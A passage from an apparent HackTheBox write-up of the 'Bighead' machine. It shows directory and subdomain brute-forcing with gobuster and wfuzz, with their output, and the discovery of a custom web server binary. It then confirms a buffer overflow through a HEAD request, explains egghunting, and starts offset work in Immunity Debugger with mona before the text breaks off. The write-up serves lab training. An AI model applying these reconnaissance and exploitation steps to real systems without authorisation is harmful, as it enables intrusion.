HERE. Also there are two links down there, First one is THIS IS PIPERNET which is the homepage and the other one is PIEDPIPERCOIN. Let’s scroll down and see what else do we have : PIEDPIPERCOIN COMES, and there’s a small description of what piedpipercoin is. After that there are some pictures for the characters from “Silicon Valley” and some stuff about each one of them, Nothing is interesting so far. At the bottom of the page there is this contact form : I looked at the contact info and I noticed that the email was info@bachmanity.htb. Let’s check that domain, but before doing that I wanted to check the other page PIEDPIPERCOIN : Instead of PIEDPIPERCOIN COMES it’s saying PIEDPIPERCOIN CAME but nothing is interesting. Let’s check bachmanity.htb, we need to add it to /etc/hosts first : bachmanity.htb It’s only that image and nothing else : Back to the contact form, I wanted to see if it’s exploitable in any way. I filled all the fields with test : It sends the request to mailer.bighead.htb, Let’s add it to /etc/hosts and try again : It shows this message then it redirects the browser back to bighead.htb. I also intercepted the request with burp : Tried to manipulate the input, but couldn’t achieve anything. I went to mailer.bighead.htb and got redirected to mailer.bighead.htb/testlink which shows this error : In the background I ran gobuster on bachmanity.htb and bighead.htb with /usr/share/wordlists/dirb/common.txt. bachmanity.htb didn’t have anything : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://bachmanity.htb/ [+] Threads : 100 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 2m0s ===================================================== 2019/04/24 20:21:01 Starting gobuster ===================================================== /index.html (Status: 200) /index.htm (Status: 200) but bighead.htb gave some results : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://bighead.htb/ [+] Threads : 100 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 2m0s ===================================================== 2019/04/24 20:16:23 Starting gobuster ===================================================== /.hta (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /assets (Status: 301) /backend (Status: 302) /Images (Status: 301) /images (Status: 301) /index.html (Status: 200) I went to /assets and it was forbidden : /backend redirected the browser to bighead.htb/BigHead which gave the same error we saw before : I clicked on error log and it gave the same error : Let’s check if there are any other subdomains. I used wfuzz with subdomains-top1mil-5000.txt from seclists: wfuzz -c -w subdomains-top1mil-5000.txt -H &quot;HOST: FUZZ.bighead.htb&quot; http://10.10.10.112 non-valid subdomain responses are 11232 chars so we will remove those from the output : wfuzz -c --hh 11232 -w subdomains-top1mil-5000.txt -H &quot;HOST: FUZZ.bighead.htb&quot; http://10.10.10.112 We got 3 subdomains : dev, mailer and code. We already know about mailer, let’s add dev and code : code.bighead.htb redirected the browser to 127.0.0.1:5080/testlink/login.php So to see what’s on code.bighead.htb we will probably need to forward an internal service to our box. We can’t do that now so we will ignore code.bighead.htb for now. dev.bighead.htb shows this image of bighead : Source has nothing interesting : I ran gobuster again and got some results : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://dev.bighead.htb/ [+] Threads : 100 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 2m0s ===================================================== 2019/04/24 20:55:05 Starting gobuster ===================================================== /.hta (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /blog (Status: 302) /blog_ajax (Status: 302) /blog_inlinemod (Status: 302) /blog_usercp (Status: 302) /blog_search (Status: 302) /blog_report (Status: 302) /blogger (Status: 302) /blogindex (Status: 302) /bloggers (Status: 302) /blogs (Status: 302) /blogspot (Status: 302) /wp-content (Status: 302) But all these pages gave this result : I intercepted the request in burp to figure out why : The response is 302, by following the redirect : It responds with another 302 So it will keep redirecting us in a loop and we won’t get anything. At this point I didn’t know what to do because all of my attempts have hit a dead end. I did a sub directory bruteforce again with wfuzz instead of gobuster and I got one more result : wfuzz --hc 404 -c -w /usr/share/wordlists/dirb/common.txt -u http://dev.bighead.htb/FUZZ The reason why gobuster didn’t show us this page is because of the status code. gobuster only showed results with these status codes : [+] Status codes : 200,204,301,302,307,403, While wfuzz showed everything except 404 responses, --hc 404. /coffee gave a response of 418 which is weird. I looked it up and found some info about it here. 418 I'm a teapot ! Anyway let’s take a look : http://dev.bighead.htb/coffee It’s showing this gif : Which is saying : “The requested entity body is short and stout. Tip me over and pour me out.” ?! I intercepted the request with burp and looked at the response : I noticed a weird server name : BigheadWebSvr 1.0. I looked it up and found a repository on the machine creator’s github (3mrgnc3) : I searched through the commits and got this one which seemed to be the right one. It asked for a password : I tried to guess it and after some attempts bighead worked : Of course it’s a windows executable so we will switch to a windows machine. At this point the hint was quite obvious : “The requested entity body is short and stout. Tip me over and pour me out.”, This server is probably vulnerable to a buffer overflow. Buffer Overflow in BigheadWebSvr I tried to run the server but it complained about some missing dll called libmingwex-0.dll : So I installed mingw and copied the dll to the same directory as the server : Then I had to allow access for it : Now the server is running : But not on port 80 : I did netstat -a -b and found that it’s running on port 8008 : Great, I intercepted the request with burp then I ran the server again with Immunity Debugger : Now we need to know how to make the server crash. First thing I wanted to try was sending a HEAD request, because you know … the machine name is BigHead :D And yes it worked. The EIP was overwritten with A. I tried to send a bigger request and the server didn’t crash, and that was a bit of a problem because we are limited to a specific size so we don’t have enough space to store our shellcode, That’s why we will use egghunting. There are a lot of great tutorials about win32 egghunting out there so I will just give you an idea of what is egghunting in case you don’t know. When we don’t have enough space on the stack to hold the shellcode, instead of sending and executing the shellcode we send a very small string called egghunter. When that egghunter is executed it searches through the entire memory for an egg. when it hits that egg it executes what’s after it (the shellcode). The egg is a 4-bytes string, say for example R1ck that egg is doubled and added before the shellcode like this : R1ckR1ck + shellcode. It’s explained very well in skape’s paper Safely Searching Process Virtual Address Space. There are also many practical tutorials just search for win32 egghunting. Now back to the vulnerable server, first thing we need to know is the offset. I’m using mona plugin. Documentation !mona config -set workingfolder c:\logs\%p, to make mona output to C:\logs To find the offset we will create a pattern !mona pc 100 (creates a pattern of 100 chars), this is the same as pattern_create.rb from metasploit. I used it in my buffer overflow write-ups. It will put the output in a file called pattern.txt in C:\logs : Pattern : Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A Full output : ``` ================================================================================ Output generated by mona.py v2.0, rev 585 - Immunity Debugger Corelan Team - https://www.corelan.be ================================================================================ Process being debugged : BigheadWebSvr (pid 1300) Current mona arguments: pc 100 ================================================================================ 2019-04-24 22:43:44 ================================================================================</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/bighead/0.png" /></entry></feed>
